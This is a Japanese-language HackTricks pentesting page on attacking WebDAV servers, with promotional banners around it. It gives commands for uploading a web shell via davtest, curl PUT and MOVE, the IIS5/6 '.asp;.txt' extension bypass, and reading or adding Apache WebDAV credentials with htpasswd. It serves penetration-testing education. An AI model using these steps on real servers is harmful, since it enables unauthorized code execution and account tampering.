# WebDav

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も**高度なコミュニティツール**によって**強化された** **ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスしてください：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>**htARTE (HackTricks AWS Red Team Expert)**を使用して、ゼロからヒーローまでAWSハッキングを学びましょう！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手してください
* 独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションである[**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)を**フォロー**してください。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、**ハッキングトリックを共有**してください。

</details>

**HTTPサーバーにWebDavが有効**な場合、通常は**HTTPベーシック認証**を介して検証される**適切な資格情報**があれば、**ファイルを操作**することが可能です。このようなサーバーを制御することは、**Webシェルのアップロードと実行**をしばしば含みます。

WebDavサーバーへのアクセスには通常、**有効な資格情報**が必要であり、それらを取得する一般的な方法としては[**WebDavブルートフォース**](../../generic-methodologies-and-resources/brute-force.md#http-basic-auth)があります。

特にサーバーサイドスクリプトの実行を防止するファイルアップロードの制限を克服するためには、次のことができます：

* もし制限されていない場合は、**実行可能な拡張子**を持つファイルを直接**アップロード**します。
* アップロードされた非実行可能なファイル（.txtなど）を実行可能な拡張子に**リネーム**します。
* アップロードされた非実行可能なファイルを**コピー**し、実行可能な拡張子に変更します。

## DavTest

**Davtest**は、**異なる拡張子を持つ複数のファイルをアップロード**し、その拡張子が**実行されるかどうかをチェック**します：
```bash
davtest [-auth user:password] -move -sendbd auto -url http://<IP> #Uplaod .txt files and try to move it to other extensions
davtest [-auth user:password] -sendbd auto -url http://<IP> #Try to upload every extension
```
## Cadaver

このツールを使用して、WebDavサーバーに接続し、**手動で**アクション（**アップロード**、**移動**、**削除**など）を実行できます。
```
cadaver <IP>
```
## PUTリクエスト

PUTリクエストは、WebDAVを使用してファイルをWebサーバーにアップロードするために使用されます。PUTリクエストを使用すると、攻撃者はWebサーバーにファイルをアップロードし、悪意のあるコードを実行する可能性があります。PUTリクエストを使用してWebサーバーにファイルをアップロードする際は、適切な認証とアクセス制御が必要です。
```
curl -T 'shell.txt' 'http://$ip'
```
## MOVE リクエスト
```
curl -X MOVE --header 'Destination:http://$ip/shell.php' 'http://$ip/shell.txt'
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も**高度な**コミュニティツールによって**強化**された**ワークフローを簡単に構築**および**自動化**できます。\
今すぐアクセスしてください：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## IIS5/6 WebDavの脆弱性

この脆弱性は非常に興味深いです。**WebDav**は、拡張子**.asp**のファイルを**アップロード**または**名前変更**することを**許可しません**。しかし、名前の最後に**";.txt"**を追加することで、ファイルは**.aspファイルとして実行**されます（**".txt"の代わりに".html"を使用**することもできますが、**";"を忘れないでください**）。

その後、シェルを".**txtファイル**"として**アップロード**し、それを".asp;.txt"ファイルに**コピー/移動**します。Webサーバーを介してそのファイルにアクセスすると、それが**実行**されます（cadaverは移動アクションが機能しなかったと言うかもしれませんが、実際には機能しています）。

![](<../../.gitbook/assets/image (18) (1) (1).png>)

## 資格情報の投稿

WebdavがApacheサーバーを使用している場合は、Apacheで構成されたサイトを確認する必要があります。一般的には:\
_**/etc/apache2/sites-enabled/000-default**_

その中に次のようなものが見つかるかもしれません:
```
ServerAdmin webmaster@localhost
Alias /webdav /var/www/webdav
<Directory /var/www/webdav>
DAV On
AuthType Digest
AuthName "webdav"
AuthUserFile /etc/apache2/users.password
Require valid-user
```
次に、有効な**資格情報**を持つファイルがあります:
```
/etc/apache2/users.password
```
ファイルの中には、**ユーザー名**と**パスワードのハッシュ値**が含まれています。これらは、WebDAVサーバーがユーザーを認証するために使用している資格情報です。

これらを**解読**したり、何らかの理由で**WebDAV**サーバーに**アクセス**したい場合は、これらを**追加**することができます：
```bash
htpasswd /etc/apache2/users.password <USERNAME> #You will be prompted for the password
```
新しい資格情報が機能しているかどうかを確認するには、次の操作を行うことができます：
```bash
wget --user <USERNAME> --ask-password http://domain/path/to/webdav/ -O - -q
```
## 参考文献

* [https://vk9-sec.com/exploiting-webdav/](https://vk9-sec.com/exploiting-webdav/)

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦で**フォロー**する [**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **HackTricks**および**HackTricks Cloud**のGitHubリポジトリにPRを提出して、あなたのハッキングテクニックを共有してください。

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスしてください：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
